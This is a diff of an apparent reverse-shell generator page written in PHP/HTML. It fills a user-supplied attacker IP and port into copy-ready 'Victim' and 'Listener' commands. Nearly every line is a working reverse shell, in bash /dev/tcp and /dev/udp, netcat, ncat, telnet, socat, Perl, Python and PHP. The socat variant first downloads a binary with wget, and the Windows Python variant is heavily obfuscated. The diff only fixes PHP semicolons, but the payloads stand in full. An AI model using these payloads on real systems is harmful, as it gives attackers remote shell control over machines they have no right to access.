@@ -652,127 +652,127 @@ IP: &lt;input type=&#34;text&#34; value=&#34;&lt;?php echo $ip;?&gt;&#34; name=&
 &lt;textarea id=&#34;txt&#34;&gt;&lt;/textarea&gt;
 &lt;h3&gt;Bash TCP:&lt;/h3&gt;
 Victim:
-&lt;pre id=&#34;cmd001&#34;&gt;bash -i &gt;&amp; /dev/tcp/&lt;?php echo $ip?&gt;/&lt;?php echo $port?&gt; 0&gt;&amp;1&lt;/pre&gt;
+&lt;pre id=&#34;cmd001&#34;&gt;bash -i &gt;&amp; /dev/tcp/&lt;?php echo $ip;?&gt;/&lt;?php echo $port;?&gt; 0&gt;&amp;1&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;cmd001&#39;)&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;cmd002&#34;&gt;/bin/bash -i &gt; /dev/tcp/&lt;?php echo $ip?&gt;/&lt;?php echo $port?&gt; 0&lt;&amp; 2&gt;&amp;1&lt;/pre&gt;
+&lt;pre id=&#34;cmd002&#34;&gt;/bin/bash -i &gt; /dev/tcp/&lt;?php echo $ip;?&gt;/&lt;?php echo $port;?&gt; 0&lt;&amp; 2&gt;&amp;1&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;cmd002&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;cmd003&#34;&gt;exec 5&lt;&gt;/dev/tcp/&lt;?php echo $ip?&gt;/&lt;?php echo $port?&gt;;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&lt;/pre&gt;
+&lt;pre id=&#34;cmd003&#34;&gt;exec 5&lt;&gt;/dev/tcp/&lt;?php echo $ip;?&gt;/&lt;?php echo $port;?&gt;;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;cmd003&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;cmd004&#34;&gt;exec /bin/sh 0&amp;lt;/dev/tcp/&lt;?php echo $ip?&gt;/&lt;?php echo $port?&gt; 1&gt;&amp;0 2&gt;&amp;0&lt;/pre&gt;
+&lt;pre id=&#34;cmd004&#34;&gt;exec /bin/sh 0&amp;lt;/dev/tcp/&lt;?php echo $ip;?&gt;/&lt;?php echo $port;?&gt; 1&gt;&amp;0 2&gt;&amp;0&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;cmd004&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;cmd005&#34;&gt;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/&lt;?php echo $ip?&gt;/&lt;?php echo $port?&gt;; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&lt;/pre&gt;
+&lt;pre id=&#34;cmd005&#34;&gt;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/&lt;?php echo $ip;?&gt;/&lt;?php echo $port;?&gt;; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;cmd005&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;Bash UDP:&lt;/h3&gt;
 Victim:
-&lt;pre id=&#34;cmd006&#34;&gt;sh -i &gt;&amp; /dev/udp/&lt;?php echo $ip?&gt;/&lt;?php echo $port?&gt; 0&gt;&amp;1&lt;/pre&gt;
+&lt;pre id=&#34;cmd006&#34;&gt;sh -i &gt;&amp; /dev/udp/&lt;?php echo $ip;?&gt;/&lt;?php echo $port;?&gt; 0&gt;&amp;1&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;cmd006&#39;);&#34;&gt;Copy&lt;/button&gt;&lt;br&gt;
 Listener:
-&lt;pre id=&#34;cmd007&#34;&gt;nc -u -lvp &lt;?php echo $port?&gt;&lt;/pre&gt;
+&lt;pre id=&#34;cmd007&#34;&gt;nc -u -lvp &lt;?php echo $port;?&gt;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;cmd007&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;Netcat:&lt;/h3&gt;
-&lt;pre id=&#34;nc01&#34;&gt;nc -e /bin/sh &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt;&lt;/pre&gt;
+&lt;pre id=&#34;nc01&#34;&gt;nc -e /bin/sh &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;nc01&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;nc02&#34;&gt;nc -e /bin/bash &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt;&lt;/pre&gt;
+&lt;pre id=&#34;nc02&#34;&gt;nc -e /bin/bash &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;nc02&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;nc03&#34;&gt;nc -c bash &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt;&lt;/pre&gt;
+&lt;pre id=&#34;nc03&#34;&gt;nc -c bash &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;nc03&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;nc04&#34;&gt;mknod backpipe p &amp;&amp; nc &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt; 0&amp;lt;backpipe | /bin/bash 1&gt;backpipe &lt;/pre&gt;
+&lt;pre id=&#34;nc04&#34;&gt;mknod backpipe p &amp;&amp; nc &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt; 0&amp;lt;backpipe | /bin/bash 1&gt;backpipe &lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;nc04&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;nc05&#34;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt; &gt;/tmp/f&lt;/pre&gt;
+&lt;pre id=&#34;nc05&#34;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt; &gt;/tmp/f&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;nc05&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;nc06&#34;&gt;rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt; 0/tmp/p 2&gt;&amp;1&lt;/pre&gt;
+&lt;pre id=&#34;nc06&#34;&gt;rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt; 0/tmp/p 2&gt;&amp;1&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;nc06&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;nc07&#34;&gt;rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|nc &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt; &gt; f&lt;/pre&gt;
+&lt;pre id=&#34;nc07&#34;&gt;rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|nc &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt; &gt; f&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;nc07&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;nc08&#34;&gt;rm -f x; mknod x p &amp;&amp; nc &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt; 0&amp;lt;x | /bin/bash 1&gt;x&lt;/pre&gt;
+&lt;pre id=&#34;nc08&#34;&gt;rm -f x; mknod x p &amp;&amp; nc &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt; 0&amp;lt;x | /bin/bash 1&gt;x&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;nc08&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;Ncat:&lt;/h3&gt;
-&lt;pre id=&#34;ncat01&#34;&gt;ncat &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt; -e /bin/bash&lt;/pre&gt;
+&lt;pre id=&#34;ncat01&#34;&gt;ncat &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt; -e /bin/bash&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ncat01&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;ncat02&#34;&gt;ncat --udp &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt; -e /bin/bash&lt;/pre&gt;
+&lt;pre id=&#34;ncat02&#34;&gt;ncat --udp &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt; -e /bin/bash&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;ncat02&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;Telnet:&lt;/h3&gt;
-&lt;pre id=&#34;telnet01&#34;&gt;rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt; 0/tmp/p 2&gt;&amp;1&lt;/pre&gt;
+&lt;pre id=&#34;telnet01&#34;&gt;rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt; 0/tmp/p 2&gt;&amp;1&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;telnet01&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;telnet02&#34;&gt;telnet &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt; | /bin/bash | telnet &lt;?php echo $ip?&gt; 444&lt;/pre&gt;
+&lt;pre id=&#34;telnet02&#34;&gt;telnet &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt; | /bin/bash | telnet &lt;?php echo $ip;?&gt; 444&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;telnet02&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;telnet03&#34;&gt;rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|telnet &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt; &gt; f&lt;/pre&gt;
+&lt;pre id=&#34;telnet03&#34;&gt;rm f;mkfifo f;cat f|/bin/sh -i 2&gt;&amp;1|telnet &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt; &gt; f&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;telnet03&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;telnet04&#34;&gt;rm -f x; mknod x p &amp;&amp; telnet &lt;?php echo $ip?&gt; &lt;?php echo $port?&gt; 0&amp;lt;x | /bin/bash 1&gt;x&lt;/pre&gt;
+&lt;pre id=&#34;telnet04&#34;&gt;rm -f x; mknod x p &amp;&amp; telnet &lt;?php echo $ip;?&gt; &lt;?php echo $port;?&gt; 0&amp;lt;x | /bin/bash 1&gt;x&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;telnet04&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;Socat:&lt;/h3&gt;
 Victim:
-&lt;pre id=&#34;socat01&#34;&gt;/tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:&lt;?php echo $ip?&gt;:&lt;?php echo $port?&gt;&lt;/pre&gt;
+&lt;pre id=&#34;socat01&#34;&gt;/tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:&lt;?php echo $ip;?&gt;:&lt;?php echo $port;?&gt;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;socat01&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;socat02&#34;&gt;socat tcp-connect:&lt;?php echo $ip?&gt;:&lt;?php echo $port?&gt; exec:&#34;bash -li&#34;,pty,stderr,setsid,sigint,sane&lt;/pre&gt;
+&lt;pre id=&#34;socat02&#34;&gt;socat tcp-connect:&lt;?php echo $ip;?&gt;:&lt;?php echo $port;?&gt; exec:&#34;bash -li&#34;,pty,stderr,setsid,sigint,sane&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;socat02&#39;);&#34;&gt;Copy&lt;/button&gt;&lt;br&gt;
 Listener:
-&lt;pre id=&#34;socat03&#34;&gt;socat file:`tty`,raw,echo=0 TCP-L:&lt;?php echo $port?&gt;&lt;/pre&gt;
+&lt;pre id=&#34;socat03&#34;&gt;socat file:`tty`,raw,echo=0 TCP-L:&lt;?php echo $port;?&gt;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;socat03&#39;);&#34;&gt;Copy&lt;/button&gt;
 &lt;br&gt;
 Victim:
-&lt;pre id=&#34;socat04&#34;&gt;wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:&lt;?php echo $ip?&gt;:&lt;?php echo $port?&gt;&lt;/pre&gt;
+&lt;pre id=&#34;socat04&#34;&gt;wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:&lt;?php echo $ip;?&gt;:&lt;?php echo $port;?&gt;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;socat04&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;Perl:&lt;/h3&gt;
 Victim:
-&lt;pre id=&#34;perl01&#34;&gt;perl -e &#39;use Socket;$i=&#34;&lt;?php echo $ip?&gt;&#34;;$p=&lt;?php echo $port?&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;&lt;/pre&gt;
+&lt;pre id=&#34;perl01&#34;&gt;perl -e &#39;use Socket;$i=&#34;&lt;?php echo $ip;?&gt;&#34;;$p=&lt;?php echo $port;?&gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;perl01&#39;);&#34;&gt;Copy&lt;/button&gt;
 
-&lt;pre id=&#34;perl02&#34;&gt;perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;&lt;?php echo $ip?&gt;:&lt;?php echo $port?&gt;&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;&lt;/pre&gt;
+&lt;pre id=&#34;perl02&#34;&gt;perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;&lt;?php echo $ip;?&gt;:&lt;?php echo $port;?&gt;&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;perl02&#39;);&#34;&gt;Copy&lt;/button&gt;&lt;br&gt;
 
 Windows only, Victim:
-&lt;pre id=&#34;perl03&#34;&gt;perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&#34;&lt;?php echo $ip?&gt;:&lt;?php echo $port?&gt;&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;&lt;/pre&gt;
+&lt;pre id=&#34;perl03&#34;&gt;perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&#34;&lt;?php echo $ip;?&gt;:&lt;?php echo $port;?&gt;&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;perl03&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;Python:&lt;/h3&gt;
 IP v4
-&lt;pre id=&#34;python01&#34;&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;?php echo $ip?&gt;&#34;,&lt;?php echo $port?&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;&lt;/pre&gt;
+&lt;pre id=&#34;python01&#34;&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;?php echo $ip;?&gt;&#34;,&lt;?php echo $port;?&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;python01&#39;);&#34;&gt;Copy&lt;/button&gt;
 
-&lt;pre id=&#34;python02&#34;&gt;export RHOST=&#34;&lt;?php echo $ip?&gt;&#34;;export RPORT=&lt;?php echo $port?&gt;;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;/bin/sh&#34;)&#39;&lt;/pre&gt;
+&lt;pre id=&#34;python02&#34;&gt;export RHOST=&#34;&lt;?php echo $ip;?&gt;&#34;;export RPORT=&lt;?php echo $port;?&gt;;python -c &#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;/bin/sh&#34;)&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;python02&#39;);&#34;&gt;Copy&lt;/button&gt;
 
-&lt;pre id=&#34;python03&#34;&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;?php echo $ip?&gt;&#34;,&lt;?php echo $port?&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;&lt;/pre&gt;
+&lt;pre id=&#34;python03&#34;&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;?php echo $ip;?&gt;&#34;,&lt;?php echo $port;?&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;python03&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 IP v6
-&lt;pre id=&#34;python04&#34;&gt;python -c &#39;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,&lt;?php echo $port?&gt;,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&#34;/bin/sh&#34;);&#39;&lt;/pre&gt;
+&lt;pre id=&#34;python04&#34;&gt;python -c &#39;import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,&lt;?php echo $port;?&gt;,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(&#34;/bin/sh&#34;);&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;python04&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 Windows only:
-&lt;pre id=&#34;python05&#34;&gt;C:\Python27\python.exe -c &#34;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;&lt;?php echo $ip?&gt;&#39;, &lt;?php echo $port?&gt;)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&#39;try&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&#34;&lt;/pre&gt;
+&lt;pre id=&#34;python05&#34;&gt;C:\Python27\python.exe -c &#34;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;&lt;?php echo $ip;?&gt;&#39;, &lt;?php echo $port;?&gt;)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&#39;try&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&#34;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;python05&#39;);&#34;&gt;Copy&lt;/button&gt;
 
 &lt;h3&gt;PHP:&lt;/h3&gt;
-&lt;pre id=&#34;php01&#34;&gt;php -r &#39;$sock=fsockopen(&#34;&lt;?php echo $ip?&gt;&#34;,&lt;?php echo $port?&gt;);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;&lt;/pre&gt;
+&lt;pre id=&#34;php01&#34;&gt;php -r &#39;$sock=fsockopen(&#34;&lt;?php echo $ip;?&gt;&#34;,&lt;?php echo $port;?&gt;);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;php01&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;php02&#34;&gt;php -r &#39;$s=fsockopen(&#34;&lt;?php echo $ip?&gt;&#34;,&lt;?php echo $port?&gt;);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);&#39;&lt;/pre&gt;
+&lt;pre id=&#34;php02&#34;&gt;php -r &#39;$s=fsockopen(&#34;&lt;?php echo $ip;?&gt;&#34;,&lt;?php echo $port;?&gt;);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$s, 1=&gt;$s, 2=&gt;$s),$pipes);&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;php02&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;php03&#34;&gt;php -r &#39;$s=fsockopen(&#34;&lt;?php echo $ip?&gt;&#34;,&lt;?php echo $port?&gt;);shell_exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;&lt;/pre&gt;
+&lt;pre id=&#34;php03&#34;&gt;php -r &#39;$s=fsockopen(&#34;&lt;?php echo $ip;?&gt;&#34;,&lt;?php echo $port;?&gt;);shell_exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;php03&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;php04&#34;&gt;php -r &#39;$s=fsockopen(&#34;&lt;?php echo $ip?&gt;&#34;,&lt;?php echo $port?&gt;);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39;&lt;/pre&gt;
+&lt;pre id=&#34;php04&#34;&gt;php -r &#39;$s=fsockopen(&#34;&lt;?php echo $ip;?&gt;&#34;,&lt;?php echo $port;?&gt;);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;php04&#39;);&#34;&gt;Copy&lt;/button&gt;
-&lt;pre id=&#34;php05&#34;&gt;php -r &#39;$s=fsockopen(&#34;&lt;?php echo $ip?&gt;&#34;,&lt;?php echo $port?&gt;);system(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;&lt;/pre&gt;
+&lt;pre id=&#34;php05&#34;&gt;php -r &#39;$s=fsockopen(&#34;&lt;?php echo $ip;?&gt;&#34;,&lt;?php echo $port;?&gt;);system(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;&lt;/pre&gt;
 &lt;button onclick=&#34;copy(&#39;php05&#39;);&#34;&gt;Copy&lt;/button&gt;
